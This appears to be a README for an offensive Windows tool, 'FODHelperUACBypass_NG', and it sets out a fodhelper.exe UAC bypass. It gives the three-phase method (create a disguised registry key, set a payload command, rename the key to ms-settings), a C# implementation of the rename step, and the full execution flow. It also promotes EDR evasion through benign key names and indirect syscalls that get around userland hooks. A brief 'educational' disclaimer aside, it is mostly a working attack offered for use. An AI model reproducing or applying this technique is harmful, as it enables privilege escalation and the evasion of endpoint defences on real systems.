# RegRenameKey Implementation in FODHelperUACBypass_NG

## Overview
This project demonstrates using the Win32 `RegRenameKey` API for atomically renaming registry keys as part of a UAC bypass technique (fodhelper.exe hijack). All other registry operations (create, set value, delete, open) use **indirect syscalls** via dynamically generated assembly stubs — see [INDIRECT-SYSCALLS.md](INDIRECT-SYSCALLS.md) for full details.

## Implementation Strategy

The program uses a three-phase approach:

### Phase 1: Create Key with Benign Name
```
Software\Classes\TempApp{GUID}\Shell\Open\command
```
- Creates registry key structure using `NtCreateKey` (indirect syscalls)
- Uses a randomized, benign-looking name (`TempApp{GUID}`)
- Sets required values:
  - `DelegateExecute` = "" (empty string)
  - Default value = payload command

### Phase 2: Atomic Rename
```
TempApp{GUID} -> ms-settings
```
- Uses Win32 `RegRenameKey` API to atomically rename the key
- Opens parent key (`Software\Classes`) with `KEY_WRITE | KEY_CREATE_SUB_KEY` access
- Calls `RegRenameKey(parentHandle, "TempApp{GUID}", "ms-settings")`
- This is atomic - the rename either succeeds completely or fails

### Phase 3: Trigger and Cleanup
- Launches `fodhelper.exe` which reads the hijacked key
- Waits and then deletes the registry key using `NtDeleteKey`

## Code Structure

### Helpers.cs - RenameRegistryKey()

The rename step is the only operation that uses Win32 P/Invoke (`advapi32.dll`). Every other registry operation goes through indirect syscalls in `Native.cs`.

```csharp
// Win32 APIs (P/Invoke) — only used for the rename step
[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
private static extern int RegRenameKey(IntPtr hKey, string lpSubKeyName, string lpNewKeyName);

[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
private static extern int RegOpenKeyEx(IntPtr hKey, string lpSubKey, uint ulOptions,
                                        uint samDesired, out IntPtr phkResult);

[DllImport("advapi32.dll", SetLastError = true)]
private static extern int RegCloseKey(IntPtr hKey);

public static bool RenameRegistryKey(string keyPath, string newName)
{
    IntPtr parentHandle = IntPtr.Zero;
    try
    {
        // 1. Parse key path to extract parent and old name
        int lastBackslash = keyPath.LastIndexOf('\\');
        string parentPath = keyPath.Substring(0, lastBackslash);   // e.g. "Software\\Classes"
        string oldKeyName = keyPath.Substring(lastBackslash + 1);  // e.g. "TempApp{GUID}"

        // 2. Open parent key with Win32 API
        int result = RegOpenKeyEx(HKEY_CURRENT_USER, parentPath, 0,
                     KEY_WRITE | KEY_CREATE_SUB_KEY, out parentHandle);
        if (result != 0) return false;

        // 3. Atomically rename using Win32 RegRenameKey
        result = RegRenameKey(parentHandle, oldKeyName, newName);
        return result == 0;
    }
    finally
    {
        if (parentHandle != IntPtr.Zero) RegCloseKey(parentHandle);
    }
}
```

## Win32 RegRenameKey API Details

### Function Signature
```c
LSTATUS RegRenameKey(
  HKEY    hKey,           // Handle to parent key
  LPCWSTR lpSubKeyName,   // Current subkey name (or NULL to rename hKey)
  LPCWSTR lpNewKeyName    // New name (must not exist)
);
```

### Requirements
- **Minimum OS**: Windows Vista / Server 2008
- **Header**: winreg.h
- **Library**: Advapi32.lib
- **DLL**: Advapi32.dll

### Required Access Rights
- Parent key needs: `KEY_CREATE_SUB_KEY`
- Subtree being renamed needs: `DELETE` access

### Return Values
- `ERROR_SUCCESS (0)`: Success
- `ERROR_ACCESS_DENIED`: Insufficient permissions
- `ERROR_ALREADY_EXISTS`: Target name already exists
- Other error codes as defined in Winerror.h

## Advantages of This Approach

1. **Atomic Operation**: RegRenameKey is atomic — no race condition window
2. **EDR Evasion**: Creating a benign key first avoids detection patterns that trigger on `ms-settings` key creation
3. **Hybrid API Strategy**: Uses Win32 `RegRenameKey` only for the rename (no NT equivalent exposed); all other registry operations use indirect syscalls to bypass userland hooks
4. **Indirect Syscalls**: `NtCreateKey`, `NtSetValueKey`, `NtDeleteKey`, `NtOpenKey`, `NtClose`, and `NtDelayExecution` all go through dynamically generated assembly stubs that jump to the `syscall` instruction inside `ntdll.dll` (see [INDIRECT-SYSCALLS.md](INDIRECT-SYSCALLS.md))

## Program Flow

```
[Create] TempApp{GUID}\Shell\Open\command (NtCreateKey — indirect syscall)
    ↓
[Set Values] DelegateExecute="" and default=payload (NtSetValueKey — indirect syscall)
    ↓
[Rename] TempApp{GUID} -> ms-settings (RegRenameKey — Win32 API)
    ↓
[Execute] fodhelper.exe (ShellExecuteEx)
    ↓
[Wait] 5 seconds (NtDelayExecution — indirect syscall)
    ↓
[Cleanup] Delete ms-settings\Shell\Open\command (NtDeleteKey — indirect syscall)
```

## Error Handling

The implementation includes detailed error messages for common failures:
- Parent key open failures
- RegRenameKey failures (already exists, access denied, not found)
- Permission issues
- Memory allocation failures

## Security Considerations

⚠️ **This is a demonstration of UAC bypass techniques for educational/research purposes.**

- Requires medium integrity level
- Fodhelper.exe must exist (C:\Windows\System32\fodhelper.exe)
- Target registry path must not already exist
- User must have write access to HKCU\Software\Classes

## References

- [RegRenameKey Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regrenamekey)
- [Registry Key Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)
- Hell's Gate / Halo's Gate syscall extraction techniques
- Fodhelper UAC bypass technique
